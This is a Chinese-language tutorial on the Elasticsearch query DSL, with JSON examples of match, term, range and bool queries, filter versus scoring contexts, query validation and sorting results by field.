<p>查询语句的结构<br>一个查询语句 的典型结构：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    QUERY_NAME: &#123;</span><br><span class="line">        ARGUMENT: VALUE,</span><br><span class="line">        ARGUMENT: VALUE,...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果是针对某个字段，那么它的结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    QUERY_NAME: &#123;</span><br><span class="line">        FIELD_NAME: &#123;</span><br><span class="line">            ARGUMENT: VALUE,</span><br><span class="line">            ARGUMENT: VALUE,...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>举个例子，你可以使用 match 查询语句 来查询 tweet 字段中包含 elasticsearch 的 tweet：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">        &quot;tweet&quot;: &quot;elasticsearch&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>完整的查询请求如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;tweet&quot;: &quot;elasticsearch&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="合并查询语句"><a href="#合并查询语句" class="headerlink" title="合并查询语句"></a>合并查询语句</h2><p>查询语句(Query clauses) 就像一些简单的组合块 ，这些组合块可以彼此之间合并组成更复杂的查询。这些语句可以是如下形式：<br>.叶子语句（Leaf clauses） (就像 match 语句) 被用于将查询字符串和一个字段（或者多个字段）对比。<br>.复合(Compound) 语句 主要用于 合并其它查询语句。 比如，一个 bool 语句 允许在你需要的时候组合其它语句，无论是 must 匹配、 must_not 匹配还是 should 匹配，同时它可以包含不评分的过滤器（filters）：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">        <span class="attr">"must"</span>:     &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tweet"</span>: <span class="string">"elasticsearch"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"must_not"</span>: &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"name"</span>:  <span class="string">"mary"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"should"</span>:   &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tweet"</span>: <span class="string">"full text"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"filter"</span>:   &#123; <span class="attr">"range"</span>: &#123; <span class="attr">"age"</span> : &#123; <span class="attr">"gt"</span> : <span class="number">30</span> &#125;&#125; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>一条复合语句可以合并 任何 其它查询语句，包括复合语句，了解这一点是很重要的。这就意味着，复合语句之间可以互相嵌套，可以表达非常复杂的逻辑。</p>
<p>例如，以下查询是为了找出信件正文包含 business opportunity 的星标邮件，或者在收件箱正文包含 business opportunity 的非垃圾邮件：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">        <span class="attr">"must"</span>: &#123; <span class="attr">"match"</span>:   &#123; <span class="attr">"email"</span>: <span class="string">"business opportunity"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"should"</span>: [</span><br><span class="line">            &#123; <span class="attr">"match"</span>:       &#123; <span class="attr">"starred"</span>: <span class="literal">true</span> &#125;&#125;,</span><br><span class="line">            &#123; <span class="attr">"bool"</span>: &#123;</span><br><span class="line">                <span class="attr">"must"</span>:      &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"folder"</span>: <span class="string">"inbox"</span> &#125;&#125;,</span><br><span class="line">                <span class="attr">"must_not"</span>:  &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"spam"</span>: <span class="literal">true</span> &#125;&#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"minimum_should_match"</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查询与过滤"><a href="#查询与过滤" class="headerlink" title="查询与过滤"></a>查询与过滤</h2><p>Elasticsearch 使用的查询语言（DSL） 拥有一套查询组件，这些组件可以以无限组合的方式进行搭配。这套组件可以在以下两种情况下使用：过滤情况（filtering context）和查询情况（query context）。</p>
<p>当使用于 过滤情况 时，查询被设置成一个“不评分”或者“过滤”查询。即，这个查询只是简单的问一个问题：“这篇文档是否匹配？”。回答也是非常的简单，yes 或者 no ，二者必居其一。</p>
<p>当使用于 查询情况 时，查询就变成了一个“评分”的查询。和不评分的查询类似，也要去判断这个文档是否匹配，同时它还需要判断这个文档匹配的有 _多好_（匹配程度如何）。</p>
<p>一个评分查询计算每一个文档与此查询的 <em>相关程度</em>，同时将这个相关程度分配给表示相关性的字段 <code>_score</code>，并且按照相关性对匹配到的文档进行排序。这种相关性的概念是非常适合全文搜索的情况，因为全文搜索几乎没有完全 “正确” 的答案。</p>
<p>注：<br>自 Elasticsearch 问世以来，查询与过滤（queries and filters）就独自成为 Elasticsearch 的组件。但从 Elasticsearch 2.0 开始，过滤（filters）已经从技术上被排除了，同时所有的查询（queries）拥有变成不评分查询的能力。</p>
<p>然而，为了明确和简单，我们用 “filter” 这个词表示不评分、只过滤情况下的查询。你可以把 “filter” 、 “filtering query” 和 “non-scoring query” 这几个词视为相同的。</p>
<p>相似的，如果单独地不加任何修饰词地使用 “query” 这个词，我们指的是 “scoring query” 。</p>
<h2 id="性能差异"><a href="#性能差异" class="headerlink" title="性能差异"></a>性能差异</h2><p>过滤查询（Filtering queries）只是简单的检查包含或者排除，这就使得计算起来非常快。考虑到至少有一个过滤查询（filtering query）的结果是 “稀少的”（很少匹配的文档），并且经常使用不评分查询（non-scoring queries），结果会被缓存到内存中以便快速读取，所以有各种各样的手段来优化查询结果。</p>
<p>相反，评分查询（scoring queries）不仅仅要找出 匹配的文档，还要计算每个匹配文档的相关性，计算相关性使得它们比不评分查询费力的多。同时，查询结果并不缓存。</p>
<p>多亏倒排索引（inverted index），一个简单的评分查询在匹配少量文档时可能与一个涵盖百万文档的filter表现的一样好，甚至会更好。但是在一般情况下，一个filter 会比一个评分的query性能更优异，并且每次都表现的很稳定。</p>
<p>过滤（filtering）的目标是减少那些需要通过评分查询（scoring queries）进行检查的文档。</p>
<h2 id="如何选择查询与过滤"><a href="#如何选择查询与过滤" class="headerlink" title="如何选择查询与过滤"></a>如何选择查询与过滤</h2><p>通常的规则是，使用 查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)。</p>
<h1 id="最重要的查询"><a href="#最重要的查询" class="headerlink" title="最重要的查询"></a>最重要的查询</h1><p>虽然 Elasticsearch 自带了很多的查询，但经常用到的也就那么几个。</p>
<h2 id="match-all-查询"><a href="#match-all-查询" class="headerlink" title="match_all 查询"></a>match_all 查询</h2><p>match_all 查询简单的 匹配所有文档。在没有指定查询方式时，它是默认的查询：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"match_all"</span>: &#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="match-查询"><a href="#match-查询" class="headerlink" title="match 查询"></a>match 查询</h2><p>无论你在任何字段上进行的是全文搜索还是精确查询，match 查询是你可用的标准查询。</p>
<p>如果你在一个全文字段上使用 match 查询，在执行查询前，它将用正确的分析器去分析查询字符串：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tweet"</span>: <span class="string">"About Search"</span> &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果在一个精确值的字段上使用它， 例如数字、日期、布尔或者一个 not_analyzed 字符串字段，那么它将会精确匹配给定的值：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"match"</span>: &#123; <span class="attr">"age"</span>:    <span class="number">26</span>           &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"match"</span>: &#123; <span class="attr">"date"</span>:   <span class="string">"2014-09-01"</span> &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"match"</span>: &#123; <span class="attr">"public"</span>: <span class="literal">true</span>         &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>:    <span class="string">"full_text"</span>  &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>注：对于精确值的查询，你可能需要使用 filter 语句来取代 query，因为 filter 将会被缓存。接下来，我们将看到一些关于 filter 的例子。</p>
<p>不像我们在 轻量 搜索 章节介绍的字符串查询（query-string search）， match 查询不使用类似 +user_id:2 +tweet:search 的查询语法。它只是去查找给定的单词。这就意味着将查询字段暴露给你的用户是安全的；你需要控制那些允许被查询字段，不易于抛出语法异常。</p>
<h2 id="multi-match-查询"><a href="#multi-match-查询" class="headerlink" title="multi_match 查询"></a>multi_match 查询</h2><p>multi_match 查询可以在多个字段上执行相同的 match 查询：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"multi_match"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>:    <span class="string">"full text search"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>:   [ <span class="string">"title"</span>, <span class="string">"body"</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="range-查询"><a href="#range-查询" class="headerlink" title="range 查询"></a>range 查询</h2><p>range 查询找出那些落在指定区间内的数字或者时间：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"range"</span>: &#123;</span><br><span class="line">        <span class="attr">"age"</span>: &#123;</span><br><span class="line">            <span class="attr">"gte"</span>:  <span class="number">20</span>,</span><br><span class="line">            <span class="attr">"lt"</span>:   <span class="number">30</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>被允许的操作符如下：<br>gt<br>   大于<br>gte<br>   大于等于<br>lt<br>   小于<br>lte<br>   小于等于</p>
<h2 id="term-查询"><a href="#term-查询" class="headerlink" title="term 查询"></a>term 查询</h2><p>term 查询被用于精确值 匹配，这些精确值可能是数字、时间、布尔或者那些 not_analyzed 的字符串：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"term"</span>: &#123; <span class="attr">"age"</span>:    <span class="number">26</span>           &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"term"</span>: &#123; <span class="attr">"date"</span>:   <span class="string">"2014-09-01"</span> &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"term"</span>: &#123; <span class="attr">"public"</span>: <span class="literal">true</span>         &#125;&#125;</span><br><span class="line">&#123; <span class="attr">"term"</span>: &#123; <span class="attr">"tag"</span>:    <span class="string">"full_text"</span>  &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>term 查询对于输入的文本不 分析 ，所以它将给定的值进行精确查询。</p>
<h2 id="terms-查询"><a href="#terms-查询" class="headerlink" title="terms 查询"></a>terms 查询</h2><p>terms 查询和 term 查询一样，但它允许你指定多值进行匹配。如果这个字段包含了指定值中的任何一个值，那么这个文档满足条件：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">"terms"</span>: &#123; <span class="attr">"tag"</span>: [ <span class="string">"search"</span>, <span class="string">"full_text"</span>, <span class="string">"nosql"</span> ] &#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>和 term 查询一样，terms 查询对于输入的文本不分析。它查询那些精确匹配的值（包括在大小写、重音、空格等方面的差异）。</p>
<h2 id="exists-查询和-missing-查询"><a href="#exists-查询和-missing-查询" class="headerlink" title="exists 查询和 missing 查询"></a>exists 查询和 missing 查询</h2><p>exists 查询和 missing 查询被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档。这与SQL中的 IS_NULL (missing) 和 NOT IS_NULL (exists) 在本质上具有共性：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"exists"</span>:   &#123;</span><br><span class="line">        <span class="attr">"field"</span>:    <span class="string">"title"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这些查询经常用于某个字段有值的情况和某个字段缺值的情况。</p>
<h1 id="组合多查询"><a href="#组合多查询" class="headerlink" title="组合多查询"></a>组合多查询</h1><p>现实的查询需求从来都没有那么简单；它们需要在多个字段上查询多种多样的文本，并且根据一系列的标准来过滤。为了构建类似的高级查询，你需要一种能够将多查询组合成单一查询的查询方法。</p>
<p>你可以用 bool 查询来实现你的需求。这种查询将多查询组合在一起，成为用户自己想要的布尔查询。它接收以下参数：</p>
<p>must<br>   文档 必须 匹配这些条件才能被包含进来。<br>must_not<br>   文档 必须不 匹配这些条件才能被包含进来。<br>should<br>   如果满足这些语句中的任意语句，将增加 _score ，否则，无任何影响。它们主要用于修正每个文档的相关性得分。<br>filter<br>   必须 匹配，但它以不评分、过滤模式来进行。这些语句对评分没有贡献，只是根据过滤标准来排除或包含文档。</p>
<p>由于这是我们看到的第一个包含多个查询的查询，所以有必要讨论一下相关性得分是如何组合的。每一个子查询都独自地计算文档的相关性得分。一旦他们的得分被计算出来， bool 查询就将这些得分进行合并并且返回一个代表整个布尔操作的得分。</p>
<p>下面的查询用于查找 title 字段匹配 how to make millions 并且不被标识为 spam 的文档。那些被标识为 starred 或在2014之后的文档，将比另外那些文档拥有更高的排名。如果 _两者_ 都满足，那么它排名将更高：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">        <span class="attr">"must"</span>:     &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"title"</span>: <span class="string">"how to make millions"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"must_not"</span>: &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>:   <span class="string">"spam"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"should"</span>: [</span><br><span class="line">            &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>: <span class="string">"starred"</span> &#125;&#125;,</span><br><span class="line">            &#123; <span class="attr">"range"</span>: &#123; <span class="attr">"date"</span>: &#123; <span class="attr">"gte"</span>: <span class="string">"2014-01-01"</span> &#125;&#125;&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果没有 must 语句，那么至少需要能够匹配其中的一条 should 语句。但，如果存在至少一条 must 语句，则对 should 语句的匹配没有要求。</p>
<h2 id="增加带过滤器（filtering）的查询"><a href="#增加带过滤器（filtering）的查询" class="headerlink" title="增加带过滤器（filtering）的查询"></a>增加带过滤器（filtering）的查询</h2><p>如果我们不想因为文档的时间而影响得分，可以用 filter 语句来重写前面的例子：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">        <span class="attr">"must"</span>:     &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"title"</span>: <span class="string">"how to make millions"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"must_not"</span>: &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>:   <span class="string">"spam"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"should"</span>: [</span><br><span class="line">            &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>: <span class="string">"starred"</span> &#125;&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"filter"</span>: &#123;</span><br><span class="line">          <span class="attr">"range"</span>: &#123; <span class="attr">"date"</span>: &#123; <span class="attr">"gte"</span>: <span class="string">"2014-01-01"</span> &#125;&#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>range 查询已经从 should 语句中移到 filter 语句</p>
<p>通过将 range 查询移到 filter 语句中，我们将它转成不评分的查询，将不再影响文档的相关性排名。由于它现在是一个不评分的查询，可以使用各种对 filter 查询有效的优化手段来提升性能。</p>
<p>所有查询都可以借鉴这种方式。将查询移到 bool 查询的 filter 语句中，这样它就自动的转成一个不评分的 filter 了。</p>
<p>如果你需要通过多个不同的标准来过滤你的文档，bool 查询本身也可以被用做不评分的查询。简单地将它放置到 filter 语句中并在内部构建布尔逻辑：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">        <span class="attr">"must"</span>:     &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"title"</span>: <span class="string">"how to make millions"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"must_not"</span>: &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>:   <span class="string">"spam"</span> &#125;&#125;,</span><br><span class="line">        <span class="attr">"should"</span>: [</span><br><span class="line">            &#123; <span class="attr">"match"</span>: &#123; <span class="attr">"tag"</span>: <span class="string">"starred"</span> &#125;&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"filter"</span>: &#123;</span><br><span class="line">          <span class="attr">"bool"</span>: &#123; </span><br><span class="line">              <span class="attr">"must"</span>: [</span><br><span class="line">                  &#123; <span class="attr">"range"</span>: &#123; <span class="attr">"date"</span>: &#123; <span class="attr">"gte"</span>: <span class="string">"2014-01-01"</span> &#125;&#125;&#125;,</span><br><span class="line">                  &#123; <span class="attr">"range"</span>: &#123; <span class="attr">"price"</span>: &#123; <span class="attr">"lte"</span>: <span class="number">29.99</span> &#125;&#125;&#125;</span><br><span class="line">              ],</span><br><span class="line">              <span class="attr">"must_not"</span>: [</span><br><span class="line">                  &#123; <span class="attr">"term"</span>: &#123; <span class="attr">"category"</span>: <span class="string">"ebooks"</span> &#125;&#125;</span><br><span class="line">              ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注 将 bool 查询包裹在 filter 语句中，我们可以在过滤标准中增加布尔逻辑</p>
<p>通过混合布尔查询，我们可以在我们的查询请求中灵活地编写 scoring 和 filtering 查询逻辑。</p>
<h2 id="constant-score-查询"><a href="#constant-score-查询" class="headerlink" title="constant_score 查询"></a>constant_score 查询</h2><p>尽管没有 bool 查询使用这么频繁，constant_score 查询也是你工具箱里有用的查询工具。它将一个不变的常量评分应用于所有匹配的文档。它被经常用于你只需要执行一个 filter 而没有其它查询（例如，评分查询）的情况下。</p>
<p>可以使用它来取代只有 filter 语句的 bool 查询。在性能上是完全相同的，但对于提高查询简洁性和清晰度有很大帮助。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"constant_score"</span>:   &#123;</span><br><span class="line">        <span class="attr">"filter"</span>: &#123;</span><br><span class="line">            <span class="attr">"term"</span>: &#123; <span class="attr">"category"</span>: <span class="string">"ebooks"</span> &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注：term 查询被放置在 constant_score 中，转成不评分的 filter。这种方式可以用来取代只有 filter 语句的 bool 查询。</p>
<h2 id="验证查询"><a href="#验证查询" class="headerlink" title="验证查询"></a>验证查询</h2><p>查询可以变得非常的复杂，尤其 和不同的分析器与不同的字段映射结合时，理解起来就有点困难了。不过 validate-query API 可以用来验证查询是否合法。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /gb/tweet/_validate/query</span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span>: &#123;</span><br><span class="line">      <span class="string">"tweet"</span> : &#123;</span><br><span class="line">         <span class="string">"match"</span> : <span class="string">"really powerful"</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>以上 validate 请求的应答告诉我们这个查询是不合法的：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"valid"</span> :         <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"_shards"</span> : &#123;</span><br><span class="line">    <span class="attr">"total"</span> :       <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"successful"</span> :  <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"failed"</span> :      <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="理解错误信息"><a href="#理解错误信息" class="headerlink" title="理解错误信息"></a>理解错误信息</h2><p>为了找出 查询不合法的原因，可以将 explain 参数 加到查询字符串中：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /gb/tweet/_validate/query?explain </span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span>: &#123;</span><br><span class="line">      <span class="string">"tweet"</span> : &#123;</span><br><span class="line">         <span class="string">"match"</span> : <span class="string">"really powerful"</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>很明显，我们将查询类型(match)与字段名称 (tweet)搞混了：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"valid"</span> :     <span class="literal">false</span>,</span><br><span class="line">  "_shards" :   &#123; ... &#125;,</span><br><span class="line">  "explanations" : [ &#123;</span><br><span class="line">    "index" :   "gb",</span><br><span class="line">    "valid" :   false,</span><br><span class="line">    "error" :   "org.elasticsearch.index.query.QueryParsingException:</span><br><span class="line">                 [gb] No query registered for [tweet]"</span><br><span class="line">  &#125; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="理解查询语句"><a href="#理解查询语句" class="headerlink" title="理解查询语句"></a>理解查询语句</h2><p>对于合法查询，使用 explain 参数将返回可读的描述，这对准确理解 Elasticsearch 是如何解析你的 query 是非常有用的：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_validate/query?explain</span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"query"</span>: &#123;</span><br><span class="line">      <span class="string">"match"</span> : &#123;</span><br><span class="line">         <span class="string">"tweet"</span> : <span class="string">"really powerful"</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们查询的每一个 index 都会返回对应的 explanation ，因为每一个 index 都有自己的映射和分析器：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"valid"</span> :         <span class="literal">true</span>,</span><br><span class="line">  "_shards" :       &#123; ... &#125;,</span><br><span class="line">  "explanations" : [ &#123;</span><br><span class="line">    "index" :       "us",</span><br><span class="line">    "valid" :       true,</span><br><span class="line">    "explanation" : "tweet:really tweet:powerful"</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    "index" :       "gb",</span><br><span class="line">    "valid" :       true,</span><br><span class="line">    "explanation" : "tweet:realli tweet:power"</span><br><span class="line">  &#125; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从 explanation 中可以看出，匹配 really powerful 的 match 查询被重写为两个针对 tweet 字段的 single-term 查询，一个single-term查询对应查询字符串分出来的一个term。</p>
<p>当然，对于索引 us ，这两个 term 分别是 really 和 powerful ，而对于索引 gb ，term 则分别是 realli 和 power 。之所以出现这个情况，是由于我们将索引 gb 中 tweet 字段的分析器修改为 english 分析器。</p>
<h1 id="排序与相关性"><a href="#排序与相关性" class="headerlink" title="排序与相关性"></a>排序与相关性</h1><p>默认情况下，返回的结果是按照 相关性 进行排序的——最相关的文档排在最前。 在本章的后面部分，我们会解释 相关性 意味着什么以及它是如何计算的， 不过让我们首先看看 sort 参数以及如何使用它。</p>
<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>为了按照相关性来排序，需要将相关性表示为一个数值。在 Elasticsearch 中， 相关性得分 由一个浮点数进行表示，并在搜索结果中通过 _score 参数返回， 默认排序是 _score 降序。</p>
<p>有时，相关性评分对你来说并没有意义。例如，下面的查询返回所有 user_id 字段包含 1 的结果：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"bool"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"term"</span> : &#123;</span><br><span class="line">                    <span class="string">"user_id"</span> : 1</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里没有一个有意义的分数：因为我们使用的是 filter （过滤），这表明我们只希望获取匹配 user_id: 1 的文档，并没有试图确定这些文档的相关性。 实际上文档将按照随机顺序返回，并且每个文档都会评为零分。</p>
<p>注：如果评分为零对你造成了困扰，你可以使用 constant_score 查询进行替代：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"constant_score"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123;</span><br><span class="line">                <span class="string">"term"</span> : &#123;</span><br><span class="line">                    <span class="string">"user_id"</span> : 1</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这将让所有文档应用一个恒定分数（默认为 1 ）。它将执行与前述查询相同的查询，并且所有的文档将像之前一样随机返回，这些文档只是有了一个分数而不是零分。</p>
<h2 id="按照字段的值排序"><a href="#按照字段的值排序" class="headerlink" title="按照字段的值排序"></a>按照字段的值排序</h2><p>在这个案例中，通过时间来对 tweets 进行排序是有意义的，最新的 tweets 排在最前。 我们可以使用 sort 参数进行实现：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span> : &#123;</span><br><span class="line">        <span class="string">"bool"</span> : &#123;</span><br><span class="line">            <span class="string">"filter"</span> : &#123; <span class="string">"term"</span> : &#123; <span class="string">"user_id"</span> : 1 &#125;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sort"</span>: &#123; <span class="string">"date"</span>: &#123; <span class="string">"order"</span>: <span class="string">"desc"</span> &#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>你会注意到结果中的两个不同点：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"hits" : &#123;</span><br><span class="line">    "total" :           6,</span><br><span class="line">    "max_score" :       null, </span><br><span class="line">    "hits" : [ &#123;</span><br><span class="line">        "_index" :      "us",</span><br><span class="line">        "_type" :       "tweet",</span><br><span class="line">        "_id" :         "14",</span><br><span class="line">        "_score" :      null, </span><br><span class="line">        "_source" :     &#123;</span><br><span class="line">             "date":    "2014-09-24",</span><br><span class="line">             ...</span><br><span class="line">        &#125;,</span><br><span class="line">        "sort" :        [ 1411516800000 ] </span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>_score 不被计算, 因为它并没有用于排序。</p>
<p>date 字段的值表示为自 epoch (January 1, 1970 00:00:00 UTC)以来的毫秒数，通过 sort 字段的值进行返回。</p>
<p>首先我们在每个结果中有一个新的名为 sort 的元素，它包含了我们用于排序的值。 在这个案例中，我们按照 date 进行排序，在内部被索引为 自 epoch 以来的毫秒数 。 long 类型数 1411516800000 等价于日期字符串 2014-09-24 00:00:00 UTC 。</p>
<p>其次 _score 和 max_score 字段都是 null 。 计算 _score 的花销巨大，通常仅用于排序； 我们并不根据相关性排序，所以记录 _score 是没有意义的。如果无论如何你都要计算 _score ， 你可以将 track_scores 参数设置为 true 。</p>
<p>注：一个简便方法是, 你可以 指定一个字段用来排序：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;sort&quot;: &quot;number_of_children&quot;</span><br></pre></td></tr></table></figure></p>
<p>字段将会默认升序排序 ，而按照 _score 的值进行降序排序。</p>
